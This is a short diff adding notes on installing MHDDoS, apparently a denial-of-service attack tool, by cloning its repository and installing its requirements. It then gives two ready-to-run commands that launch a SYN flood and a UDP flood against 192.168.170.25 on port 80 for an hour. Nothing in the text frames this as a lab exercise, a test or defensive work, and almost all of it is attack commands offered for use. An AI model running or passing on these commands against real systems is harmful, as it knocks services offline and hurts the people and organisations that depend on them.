@@ -1,0 +1,10 @@
+- installation
+    git clone https://github.com/MHProDev/MHDDoS.git
+    cd MHDDoS
+    pip install -r requirements.txt
+
+- attack syn flood
+sudo $(which python3) start.py syn 192.168.170.25:80 1 3600
+
+- attack udp flood
+sudo $(which python3) start.py udp 192.168.170.25:80 1 3600
